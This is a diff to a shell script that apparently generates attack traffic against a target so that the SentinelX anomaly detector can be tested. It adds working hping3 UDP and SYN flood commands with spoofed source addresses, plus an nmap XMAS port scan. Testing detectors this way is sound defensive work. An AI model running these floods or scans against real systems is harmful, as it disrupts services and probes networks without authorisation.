@@ -46,18 +46,46 @@ echo ""
 sleep 2
 
 # ──────────────────────────────────────────────────────────────
-# ATTACK 2: Fragmented UDP Flood (GraphSAGE Trigger)
+# ATTACK 2: Fragmented UDP Flood (GraphSAGE + Isolation Forest)
 # ──────────────────────────────────────────────────────────────
-echo -e "${BOLD}[ATTACK 2/2] Fragmented UDP Flood -- Graph Anomaly Trigger${RESET}"
-echo -e "${YELLOW}  Blasting $TARGET with fragmented UDP packets for GraphSAGE...${RESET}"
+echo -e "${BOLD}[ATTACK 2/4] Fragmented UDP Flood -- Graph Anomaly Trigger${RESET}"
+echo -e "${YELLOW}  Blasting $TARGET with fragmented UDP packets on random ports...${RESET}"
 
-timeout 10 hping3 --udp --frag --flood --rand-dest $TARGET 2>/dev/null &
+# Fixed: removed --rand-dest (requires interface), use --rand-source to spoof source IPs
+timeout 10 hping3 --udp --frag --flood --rand-source -p ++1 $TARGET 2>/dev/null &
 HPING_PID=$!
 sleep 10
 kill $HPING_PID 2>/dev/null
 wait $HPING_PID 2>/dev/null
 
 echo -e "${GREEN}  [DONE] Fragmented UDP flood stopped.${RESET}"
+echo ""
+sleep 2
+
+# ──────────────────────────────────────────────────────────────
+# ATTACK 3: XMAS Scan (Unusual TCP flag combination)
+# ──────────────────────────────────────────────────────────────
+echo -e "${BOLD}[ATTACK 3/4] XMAS Scan -- Unusual Flag Combination${RESET}"
+echo -e "${YELLOW}  Sending packets with FIN+PSH+URG flags (never seen in normal traffic)...${RESET}"
+
+nmap -sX -T4 --top-ports 50 $TARGET
+echo -e "${GREEN}  [DONE] XMAS scan complete.${RESET}"
+echo ""
+sleep 2
+
+# ──────────────────────────────────────────────────────────────
+# ATTACK 4: Massive SYN flood on random high ports
+# ──────────────────────────────────────────────────────────────
+echo -e "${BOLD}[ATTACK 4/4] SYN Flood on Random Ports -- Heavy Anomaly${RESET}"
+echo -e "${YELLOW}  Flooding $TARGET with SYN packets on random ports for 10 seconds...${RESET}"
+
+timeout 10 hping3 -S --flood --rand-source -p ++1 $TARGET 2>/dev/null &
+HPING2_PID=$!
+sleep 10
+kill $HPING2_PID 2>/dev/null
+wait $HPING2_PID 2>/dev/null
+
+echo -e "${GREEN}  [DONE] SYN flood stopped.${RESET}"
 echo ""
 
 echo -e "${CYAN}  Sequence complete! Check the SentinelX monitor on Ubuntu!${RESET}"
